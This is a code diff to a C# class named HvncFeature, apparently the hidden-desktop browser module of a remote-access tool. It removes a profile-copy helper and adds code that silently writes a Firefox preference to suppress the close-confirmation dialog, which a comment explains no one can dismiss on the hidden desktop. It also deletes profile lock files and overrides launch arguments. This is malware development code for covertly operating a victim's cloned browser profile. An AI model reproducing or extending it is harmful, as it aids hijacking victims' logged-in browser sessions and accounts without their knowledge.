@@ -1701,23 +1701,6 @@ internal static class HvncFeature
         catch { }
     }
 
-    private static void CloneProfileToDir(string src, string dst)
-    {
-        var pairs = new List<(string Src, string Dst)>();
-        CollectFilePairs(src, dst, pairs);
-        if (pairs.Count == 0) return;
-        Parallel.ForEach(pairs, _cloneParallel, static pair =>
-        {
-            for (int attempt = 0; attempt < 4; attempt++)
-            {
-                try { File.Copy(pair.Src, pair.Dst, overwrite: true); break; }
-                catch (IOException) { if (attempt < 3) Thread.Sleep(250); else break; }
-                catch (UnauthorizedAccessException) { break; }
-                catch { break; }
-            }
-        });
-    }
-
     private static void CloneProfileWithProgress(string src, string dst, string label)
     {
         var pairs = new List<(string Src, string Dst)>();
@@ -2246,6 +2229,17 @@ internal static class HvncFeature
                     // profile is missing (browser not installed) — without this the UI spinner hangs.
                     SendHvncProgress(100, "");
                 }
+                // Suppress the "Quit Firefox?" dialog that appears on WM_CLOSE when multiple
+                // tabs are open. Without this, GracefulKillBrowsers sends WM_CLOSE but Firefox
+                // blocks on the dialog (hidden desktop, nobody can dismiss it) → times out →
+                // hard kill anyway → WAL not checkpointed. user.js is read every startup and
+                // its entries override prefs.js, so appending works even on a cloned profile.
+                try
+                {
+                    File.AppendAllText(Path.Combine(hvncProfile, "user.js"),
+                        "\nuser_pref(\"browser.tabs.warnOnClose\", false);\n");
+                }
+                catch { }
                 foreach (var lk in new[] { "parent.lock", "lock" })
                     try { File.Delete(Path.Combine(hvncProfile, lk)); } catch { }
                 // Drop all server-supplied args — keep only the quoted exe, then add ours.
